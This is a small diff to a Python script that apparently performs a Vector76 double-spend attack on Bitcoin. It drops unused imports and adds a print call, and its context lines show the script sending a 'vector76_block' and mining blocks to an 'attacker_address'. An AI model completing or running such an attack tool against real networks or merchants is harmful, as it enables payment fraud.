@@ -3,14 +3,7 @@ import time
 import requests
 import subprocess
 import cryptos
-import hashlib
-import uuid
-import json
 import subprocess
-
-
-from bitcoinrpc.authproxy import AuthServiceProxy
-
 
 from bs4 import BeautifulSoup
 
@@ -138,7 +131,7 @@ send_rawtransaction(vector76_block)
 for i in range(6):
     print(f" {i + 1} / 6   ...")
     generate_block(attacker_address, vector76_block)
-
+print()
 print("[+] READY...")
 print()
 print()
